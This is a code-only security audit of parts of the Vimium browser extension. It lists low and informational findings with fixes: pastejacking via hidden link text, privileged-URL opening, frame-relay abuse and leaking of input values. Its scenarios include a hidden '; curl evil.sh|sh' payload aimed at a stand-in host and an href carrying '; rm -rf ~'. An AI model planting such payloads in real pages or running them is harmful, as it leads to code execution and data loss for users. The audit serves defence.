# Audit: link hints, DOM utils, marks, search results, keyboard utils, CSS

Scope: content_scripts/link_hints.js, lib/dom_utils.js, lib/rect.js, content_scripts/search_results.js,
lib/keyboard_utils.js, content_scripts/marks.js, content_scripts/vimium.css, content_scripts/file_urls.css.
I read the code only. Nothing was executed in a browser. Where a finding depends on browser behavior, the finding says so.

Summary: 0 High, 0 Medium, 4 Low, 8 Info.

No finding lets an ordinary page script run code in the extension, read another site's data or
send data over the network. The Low findings are: a page tricking the user into copying hidden
text; a page link opening URLs the page itself could not open; and two issues that matter only if
an attacker has already taken over a page's renderer process (a "compromised renderer").

---

## 1. Findings

### L1. Low: "Copy link text" copies hidden text (pastejacking)
- **Where:** content_scripts/link_hints.js:124 (`link.textContent`) → hud.js:184 → pages/hud_page.js:198 (`navigator.clipboard.writeText`, which only replaces nbsp).
- **What an attacker can do:** put text the user can't see on the clipboard. `textContent` includes text in `display:none` nodes, `<style>`/`<script>` children and newlines. The browser's own copy (selection) uses the rendered text instead.
- **Scenario:** a docs or blog page shows a link labelled `brew install foo`. Its real markup is `<a>brew install foo<span style="display:none">; curl evil.sh|sh&#10;</span></a>`. The user runs "yank link text" and pastes into a terminal. The trailing newline runs the payload. Bracketed paste in modern shells blocks this. Older shells and plain terminals do not.
- **HUD does not warn:** it shows only the first 26 characters, so the user does not see the hidden tail.
- **Fix:** use `link.innerText`, which drops `display:none` and script/style text. Also collapse whitespace (`.replace(/\s+/g, " ").trim()`) so the copy contains no newlines. Optionally, show the full length in the HUD when the text was truncated.

### L2. Low: "Open link in incognito" opens URLs a web page could never navigate to
- **Where:** link_hints.js:111-113 sends the page-controlled `link.href` → background_scripts/main.js:581-585 → tab_operations.js:11-15 `toNavigableUrl` → `chrome.windows.create({incognito:true,url})`.
- **What an attacker can do:** `isBlockedUrl` blocks only javascript:/data:/vbscript:. `hasChromeProtocol` and `urlHasProtocol` (url_utils.js:105-119) accept `chrome://…`, `file:///…`, `view-source:…`, `chrome-extension://…` and `about:…`. A web page cannot normally navigate to these. Here the extension opens them for the page.
- **Scenario:** a page labels a link "Download report" with `href="file:///Users/<name>/.ssh/"` or `chrome://settings/...`. The user picks it with "open in incognito" and the extension opens it.
- **Harm is limited:**
  - The attacker cannot read the result.
  - Chrome may refuse some of these for extension-initiated navigation. I did not test which ones.
  - The real problem is that a page can use the extension to get around the browser's rule against web pages opening privileged URLs.
- **Fix:** URLs that come from page content, such as link hrefs, should only open when the scheme is `http:`, `https:` (and maybe `ftp:`/`mailto:`). Use a separate `toWebUrl()` instead of the omnibar-style `toNavigableUrl`. The same applies to `simulateClickDefaultAction` (dom_utils.js:386-418, see I7).

### L3. Low (compromised renderer only): the background relay lets one frame drive hints and clicks in other frames of the tab
- **Where:**
  - background_scripts/main.js:481-486 `broadcastLinkHintsMessage` forwards any request from any frame of the tab to all frames, with any `messageType`.
  - vimium_frontend.js:367-370 dispatches `HintCoordinator[request.messageType](request, sender)`.
  - link_hints.js:174-179 `willHandleMessage` allows `prepareToActivateMode`/`activateMode`/`getHintDescriptors`/`exit` at any time. While hint mode is active, it allows *any* property name.
- **Who can do it:** page scripts cannot send runtime messages (the manifest has no `externally_connectable`). A cross-origin iframe whose renderer has been compromised can, because it can send messages as the content script.
- **What the attacker can do:** with site isolation, that iframe runs in its own process. It can send these messages through the relay:
  1. `getHintDescriptors`, which makes the top frame compute `localHints`.
  2. `activateMode` with `frameId:0` and an empty map, which makes the top frame build markers for its own hints.
  3. `updateKeyState` with chosen `hintKeystrokeQueue`/`linkTextKeystrokeQueue`.
  4. `exit {isSuccess:true}`.

  The top frame then calls `DomUtils.simulateClick` on the chosen element (link_hints.js:736-765, 788-790). The result is a synthetic click on, for example, a "Delete" or "Approve" button in a cross-origin parent page, without the user doing anything. Calling arbitrary method names (`onExit`, `sendMessage`, `getLocalHint`) mostly just throws.
- **Fix:**
  - In the background, allow only `updateKeyState`, `rotateHints`, `setOpenLinkMode`, `activateActiveHintMarker` and `exit` in the broadcast.
  - Accept them only while a hint session that the background started (`prepareToActivateLinkHintsMode`) is active for that tab.
  - In `willHandleMessage`, replace "any key while active" with a fixed list.

  A compromised frame can still steer hints during a session the user started, but it can no longer start one or click without user action.

### L4. Low (compromised renderer only): filter-mode hints send link text and input values to every frame
- **Where:** link_hints.js:1498-1501 and 1506-1551 (`generateLinkText`) → descriptors with `linkText` → main.js:489-563 sends every frame's descriptors to every other frame.
- **What is leaked:** `linkText` includes the `value` of every non-password `<input>` (line 1524), link text (up to 256 characters) and `innerHTML` (line 1547). So the top frame's form contents reach the content script in every cross-origin iframe, such as ads or embeds. Examples: email address, card number field, one-time codes, search boxes.
- **Who can read it:** page scripts cannot read content-script memory, but a compromised renderer of that iframe can.
- **Partial leak without a compromised renderer:** the iframe page can see its own marker elements in its DOM. When the user types filter text, it sees how they are renumbered or hidden. That gives a small leak of what the user typed and how many links in other frames matched.
- **Only in filter mode:** `filterLinkHints` defaults to false (lib/settings.js:13).
- **Fix:**
  - Do not use `input.value` as link text. Use the label, placeholder or `aria-label` only.
  - Better: match filter text inside each frame and broadcast only scores or match flags, not the text.

### I1. Info: dead global `isVimiumHelpDialog` can be set by the page (DOM clobbering)
- **Where:** link_hints.js:215 and 229 read `globalThis.isVimiumHelpDialog`. Nothing defines it; the help page sets `isVimiumHelpDialogPage` (pages/help_dialog_page.js:206). So this always reads `undefined`, unless the page adds `<div id="isVimiumHelpDialog">`. Window named-property access is expected to reach isolated worlds, but I did not test this.
- **Effect:** `requestedByHelpDialog` becomes truthy (the element is serialized to `{}`). Every frame that is not clobbered then returns `[]`, so a page can hide hints for its own iframes. It is a nuisance only.
- **Related, in vimium_frontend.js:447/452/461 (another auditor's file):** `isVimiumHelpDialogPage` can be clobbered the same way. `HelpDialog.toggle` then calls `HelpDialogPage.hide()`, which is undefined in content scripts, so the help dialog fails to open. This is also only a DoS.
- **Fix:** use the real flag. Set both flags explicitly to `false` in the content script, e.g. `globalThis.isVimiumHelpDialogPage ??= false` before page parsing (document_start). Or keep them in module-scope `let` variables instead of reading `globalThis`.

### I2. Info: replay setting check is broken
- **Where:** link_hints.js:268 `Settings.get("filterLinkHints" && this.cacheAllKeydownEvents)` evaluates to `Settings.get(<object|null>)`, so keydown replay never runs.
- **Safety impact:** none. It is a plain bug.
- **Fix:** `Settings.get("filterLinkHints") && this.cacheAllKeydownEvents`.

### I3. Info: "Copy link URL" preview hides most of the URL
- **Where:** link_hints.js:96-106. The HUD shows 26 characters.
- **What an attacker can do:** an `href` with a non-special scheme (`x: ; rm -rf ~`) keeps spaces and `;|`. The URL parser strips newlines, so pasting it into a terminal cannot run it on its own. The browser's own "Copy link address" behaves the same way.
- **Bug:** SVG `<a>` has `href` as an `SVGAnimatedString`. It passes the `!!element.href` filter (line 1412), then `url.slice` throws (line 99). Use `link.href?.baseVal ?? link.href` or `getAttribute`, and resolve it.

### I4. Info: image-map selector is built from an unescaped page attribute
- **Where:** link_hints.js:1148-1149. `.replace('"','\\"')` escapes only the first quote and no backslashes.
- **Effect:** a crafted `usemap` makes `querySelector` throw, which stops hint collection on that page. The page can only break its own hints. No injection outside the page's own DOM is possible.
- **Fix:** `CSS.escape(mapName)`, or `document.getElementsByName`/`[...document.querySelectorAll("map")].find(m => m.name === mapName)`.

### I5. Info: the page can make hint cleanup throw
- **Where:** dom_utils.js:58-60 `removeElement` assumes `parentNode` is not null. If the page removes `#vimium-hint-marker-container`, `removeHintMarkers` (link_hints.js:846-851) throws inside `activateLink`/`deactivateMode`. The link is not activated, and hint mode may stay in place until Esc.
- **Effect:** DoS against itself only.
- **Fix:** `el?.remove()`.

### I6. Info: Google results host regex also matches other domains
- **Where:** search_results.js:15 `/^(www\.)?google\.[a-z]+(\.[a-z]+)?$/` matches `google.attacker.com`.
- **Effect:** arrow keys move focus between `#search a:has(h3)` links on the attacker page. That is harmless: it only focuses links that page already owns.
- **Fix:** anchor to known Google ccTLDs, or accept it as is.

### I7. Info: `simulateClickDefaultAction` has no caller
- **Where:** dom_utils.js:386-418. A grep finds no caller.
- **Risk if wired up again:** it sends a page-controlled `href` to `openUrlInNewTab`/`openUrlInNewWindow`, which has the same scheme issue as L2.
- **Fix:** delete it.

### I8. Info: local marks store full URLs with query strings in shared extension storage
- **Where:** marks.js:19-21 and 81. The key is `vimiumMark|<href without #>|<char>`.
- **What is stored:** query strings can contain tokens (password-reset links, OAuth `code=`, signed URLs). They are kept in `chrome.storage.local` with no expiry and no cleanup.
- **Who can read it:** page scripts cannot. Content scripts can read `chrome.storage.local`, so a compromised renderer of any site can read the marks of every site. The old per-origin `localStorage` did not allow that.
- **Fix:** key on `origin + pathname` (drop the search part), or hash the URL (SHA-256 via `crypto.subtle`). Add a size or age limit.

---

## 2. Coverage

| File | Lines | Status |
|---|---|---|
| content_scripts/link_hints.js | 1572 | read in full |
| lib/dom_utils.js | 572 | read in full |
| lib/rect.js | 113 | read in full |
| content_scripts/search_results.js | 63 | read in full |
| lib/keyboard_utils.js | 154 | read in full |
| content_scripts/marks.js | 139 | read in full |
| content_scripts/vimium.css | 266 | read in full |
| content_scripts/file_urls.css | 6 | read in full |

Code in other files that I followed to judge findings:
- background_scripts/main.js:470-600 and 675-710: hint coordinator, URL handlers, onMessage.
- background_scripts/tab_operations.js:1-80.
- lib/url_utils.js:1-136.
- content_scripts/vimium_frontend.js:1-30, 360-375 and 440-470.
- content_scripts/hud.js:170-200.
- pages/hud_page.js: copyToClipboard and the textContent sinks.
- lib/utils.js: forTrusted, monitorChromeSessionStorage, addChromeRuntimeOnMessageListener.
- manifest.json.
- lib/settings.js: defaults.

Cross-cutting notes (outside my files, not counted above):
- lib/utils.js:230-238 `monitorChromeSessionStorage`: the onChanged listener ignores `_area`. A change to the same key in `storage.local` (or sync) is applied as if it came from session. This matters little today, since nothing writes `mapKeyRegistry` to local. Check `area === "session"`.
- background_scripts/main.js:21 `storage.session` is open to content scripts (TRUSTED_AND_UNTRUSTED_CONTEXTS). A compromised renderer can therefore read `vimiumSecret` and write `mapKeyRegistry`/`passNextKeyKeys`, which content scripts in every tab trust. I assume the UI-component and background auditors cover this.
- web_accessible_resources (vimium.css, hud_page.html, …) for `<all_urls>` without `use_dynamic_url`, plus the `:root { --vimium-* }` CSS variables: any site can detect that the extension is installed (fingerprinting).

## 3. Safe, and why

- Hint labels and captions: `spanWrap` uses `textContent` per character (link_hints.js:1116-1125), and `renderMarker` goes through it. Page text never becomes HTML.
- `element.innerHTML` (link_hints.js:1547) is only read for scoring. It is never written anywhere.
- No eval, `Function`, string timers, `import()`, `document.write`, `insertAdjacentHTML`, postMessage listeners or network calls in any of my files.
- Marker and flash positions are set via `style.left/top` with numeric values plus `"px"` (link_hints.js:495-496, dom_utils.js:434-437). There is no CSS string injection.
- `simulateMouseEvent` (dom_utils.js:372-383) creates untrusted events. The browser still enforces popup and download gestures, and only page elements receive them.
- Open-in-tab modes use synthetic clicks with modifiers, not background `tabs.create`. The browser's own navigation rules (javascript: and so on) apply.
- `HintCoordinator.activateMode` and other messages arrive only from the background via `tabs.sendMessage`. Page scripts cannot reach `runtime.onMessage` (no `externally_connectable`). The background checks `sender.tab`.
- FilterHints `RegExp` built from the `linkHintNumbers` setting is escaped with `Utils.escapeRegexSpecialCharacters` (link_hints.js:938-940).
- `globalThis.frameId` is set explicitly (vimium_frontend.js:9), so an own property blocks clobbering. `windowIsFocused` is a function declaration.
- `forTrusted` (lib/utils.js:3-13) gates DOMContentLoaded and load listeners in dom_utils.js on `isTrusted`.
- marks.js `JSON.parse` only reads values this content script wrote to `chrome.storage.local`. `location.hash = position.hash` only restores this page's own hash.
- Global marks only send `markName` to the background. The scroll position comes from the top frame. HUD messages are rendered with `textContent` (hud_page.js:101).
- keyboard_utils.js only maps key names. `mapKeyRegistry` comes from extension session storage, not the page.
- rect.js is pure arithmetic.
- search_results.js only calls `focus()`/`scrollIntoView()` on page links, using a constant selector.
- vimium.css and file_urls.css are static. They contain no `url()`, `@import` or external fonts, so they cause no network egress.
